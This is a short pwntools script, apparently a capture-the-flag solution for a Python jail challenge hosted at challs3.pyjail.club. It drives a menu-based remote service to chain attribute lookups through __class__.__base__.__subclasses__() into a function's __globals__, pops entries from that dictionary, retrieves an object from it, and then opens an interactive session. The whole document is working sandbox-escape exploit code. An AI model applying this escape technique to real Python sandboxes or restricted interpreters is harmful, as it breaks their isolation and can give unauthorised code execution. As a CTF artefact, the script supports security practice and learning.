from pwn import *


def function(name: str):
	conn.sendlineafter(b"> ", b"1")
	conn.sendlineafter(b"> ", name.encode())
	conn.sendlineafter(b"> ", b"2")


def call():
	conn.sendlineafter(b"> ", b"2")


def attr(name: str):
	conn.sendlineafter(b"> ", b"1")
	conn.sendlineafter(b">", name.encode())


def run(s):
	x = s.split(".")
	if x[0] == "obj":
		x.pop(0)
	for c in x:
		attr(c.rstrip("()"))
		while c.endswith("()"):
			call()
			c = c.removesuffix("()")


conn = remote("challs3.pyjail.club", 8899)

for i in range(15):
	print(i)
	run("__class__.__base__.__subclasses__().pop().__enter__.__globals__.popitem()")
run(
	"__class__.__base__.__subclasses__().pop().__enter__.__globals__.values().__reversed__().__next__()"
)
conn.interactive()
